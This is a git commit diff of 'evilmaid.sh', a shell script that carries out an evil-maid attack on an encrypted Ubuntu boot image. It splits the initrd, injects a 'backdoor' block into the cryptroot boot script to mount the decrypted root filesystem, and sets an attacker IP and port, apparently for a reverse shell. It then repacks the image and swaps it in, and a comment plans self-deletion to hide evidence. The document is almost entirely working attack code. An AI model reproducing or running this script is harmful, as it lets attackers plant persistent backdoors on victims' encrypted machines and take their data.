4ed98286509e45ab311ea255c40a85d91faeb0bc
SpiritHunt3r <32915178+SpiritHunt3r@users.noreply.github.com>
2022-08-09 19:41:56 -0600

    SH Updated and Documented

--- evilmaid.sh
+++ evilmaid.sh
@@ -1,56 +1,64 @@
 #!/bin/sh
 
-# Attack
+# DO NOT USE IF YOU ARE ON A REAL MACHINE, USE UNDER YOUR RISK !
+# Only Modify the firt 4 variables in that order.
+
+# Attacker Values and Information.
+
+# Attacker Setup IP and Port
 IP="192.168.0.111"
 PORT=8005
-
-# Install/Run BinWalk to find line where "...compressed data, from Unix,.."
-# and replace Decimal value here
-SPLIT_LOC=4641792
 
 # Veriify and paste the version after "initrd.img-" example: 5.1.3-9-generic
 KERNEL_VERSION="#.#.#-#-generic"
 
-# Constants do not change it !!!
+# Install/Run BinWalk to find line where "...compressed data, from Unix,.." and replace Decimal value here
+SPLIT_LOC=99999999
 
+
+# ------------------ Constants do not change it !!! -----------------------------------------
+
+# Define File and Sizes to use
 FILE_NAME="initrd.img-$KERNEL_VERSION"
 BLOCK_SIZE=512
+let COUNT=$SPLIT_LOC/$BLOCK_SIZE
+
+# Define Files names that will be use on the Script
 NAME_MICRO="initrd.microcode"
 NAME_IMAGE="image"
+
+# Define Directory and Paths to work files previusly defined.
 EVIL="evilmaid"
-BOOT="/boot"
 EXTRACT="extraction"
 WORKING_PATH="/home/$USER/Desktop"
 RETURN_PATH=$(pwd)
 
-# Function
-let COUNT=$SPLIT_LOC/$BLOCK_SIZE
 
-# blah blah 
+# Move inmediatly to the Working Path and Copy the File to Modify
 cd "$WORKING_PATH/"
 mkdir -p $EVIL
 cp "$RETURN_PATH/$FILE_NAME" "$WORKING_PATH/$EVIL/$FILE_NAME"
-
 cd "$EVIL/"
 
 
-# dd s
+# Split the Kernel File in the right sizes to modify only the Configuration and Keep the microcode intact
 dd if="$FILE_NAME" bs=$BLOCK_SIZE count=$COUNT of=$NAME_MICRO
-
 dd if="$FILE_NAME" bs=$SPLIT_LOC skip=1 of=$NAME_IMAGE
 
-# extraction
+# Create a directory to work the configuration files of Kernel
 mkdir -p $EXTRACT
-
 mv $NAME_IMAGE ./$EXTRACT/
 cd $EXTRACT
 zcat $NAME_IMAGE | cpio -id
 
-#rm $NAME_IMAGE
+# We remove the image file to avoid rencripting this file into the modificated kernel
+rm $NAME_IMAGE
 
+# Open the and Modify the file to inject the reverse shell
 cd "scripts/local-top/"
 sed -i '$ d' cryptroot
 
+# Append reverse shell code into the kernel configuration
 echo "
 # backdoor
 mount /dev/mapper/ubuntu--vg-root /tmp
@@ -59,16 +67,15 @@ umount /tmp
 
 exit 0" >> cryptroot
 
+# Returns to Working Path to regenerate the package that will replace the original one
 cd "$WORKING_PATH/$EVIL/$EXTRACT"
-
-# generate package
 find . | cpio -H newc -o | gzip -9 > package
 mv package ../package
 cd ..
 cat $NAME_MICRO package > $FILE_NAME
 
+# Replace the original kernel with the modificated one that we create
 cp $FILE_NAME $RETURN_PATH/$FILE_NAME
 
- 
-
+# The idea was the scrip auto destroys itself to remove any evidence of the attack but we did not test this.
 #rm $RRETURN_PATH/evilmaid.sh
